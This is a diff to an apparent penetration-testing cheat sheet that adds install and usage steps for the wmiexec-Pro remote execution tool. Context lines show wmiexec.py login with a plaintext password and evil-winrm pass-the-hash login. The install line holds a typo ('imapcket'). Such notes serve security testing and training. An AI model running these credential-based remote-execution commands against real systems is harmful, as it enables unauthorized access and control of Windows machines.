@@ -49,3 +49,18 @@ wmiexec.py marvel.local/Thor:P@$$w0rd@10.10.10.10
 evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.162.183
 ```
 
+#### Wmicexec-Pro : 
+
+Installation
+```sh
+git clone https://github.com/fortra/impacket ; cd imapcket && sudo pip3 install .
+git clone https://github.com/XiaoliChan/wmiexec-Pro
+```
+
+**[Usage](https://github.com/XiaoliChan/wmiexec-Pro#usage)**
+```python
+python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output
+# There are many more uses, please  check the usage and help section.
+```
+
+- - -
